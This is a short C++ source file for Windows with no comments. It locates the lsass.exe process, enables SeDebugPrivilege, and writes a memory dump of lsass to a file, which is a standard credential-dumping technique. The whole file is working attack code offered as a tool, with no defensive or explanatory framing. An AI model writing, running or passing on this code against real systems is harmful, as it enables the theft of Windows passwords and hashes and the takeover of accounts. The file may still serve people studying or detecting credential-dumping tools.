#pragma comment (lib, "dbghelp.lib")
#pragma comment (lib, "ws2_32.lib")

#include <iostream>
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <sstream>

bool IsElevated()
{
    bool elevated;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            elevated = elevation.TokenIsElevated;
        }
    }

    if (token) {
        CloseHandle(token);
    }

    return elevated;
}

DWORD getLsassPid()
{
    DWORD processPID = 0;
    HANDLE snap_handler = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    bool pRes = false;
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    std::string lsass_processname = "lsass.exe";

    pRes = Process32First(snap_handler, &processEntry);
    while (pRes != 0) {
        if (strcmp(lsass_processname.c_str(), processEntry.szExeFile) == 0) {
            processPID = processEntry.th32ProcessID;
        }
        pRes = Process32Next(snap_handler, &processEntry);
        
    }
    return processPID;
}

bool SetPrivilege()
{
    std::string priv_name = "SeDebugPrivilege";
    std::wstring privilege_name(priv_name.begin(), priv_name.end());
    const wchar_t* privName = privilege_name.c_str();

    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE tokenPriv = NULL;
    LUID luid = { 0,0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv) || !LookupPrivilegeValueW(0, privName, &luid)) {
        if (tokenPriv) {
            CloseHandle(tokenPriv);
        }
        return false;
    }

    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    if (!AdjustTokenPrivileges(tokenPriv, false, &priv, 0, 0, 0)) {
        if (tokenPriv) {
            CloseHandle(tokenPriv);
        }
        return false;
    }
    return (true);
}

bool dump(std::string filename = "pouet.pmd") {
    bool privAdded = SetPrivilege();

    if (!IsElevated() || !privAdded || filename.length() <= 0) {
        return false;
    }

    std::cout << "Elevatedd" << std::endl;

    DWORD processPID = getLsassPid();
    std::cout << "Get Pid: " << processPID << std::endl;
    std::wstring wFname = std::wstring(filename.begin(), filename.end());
    LPCWSTR pointer_filename = (LPCWSTR)wFname.c_str();
    HANDLE output = CreateFileW(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    std::cout << "File Created" << std::endl;
    DWORD processAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    HANDLE processHandler = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processPID);

    std::cout << "Open Process" << std::endl;


    if (processHandler && processHandler != INVALID_HANDLE_VALUE && output != INVALID_HANDLE_VALUE) {
        bool isDumped = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);

        if (isDumped) {
            return true;
        } else {
            DWORD dwErr = GetLastError();
            printf("MiniDumpWriteDump -FAILED (LastError:%u)\n", dwErr);
        }
    }
    return false;
}

int main(int ac, char** av) {
    bool dumped = false;
    if (ac >= 2) {
        std::string filename = av[1];
        if (filename.length() > 0) {
            dumped = dump(filename);
        }
        else {
            dumped = dump();
        }
    }
    if (dumped) {
        std::cout << "Data dumped" << std::endl;
    }
    else {
        std::cout << " :'( " << std::endl;
    }
}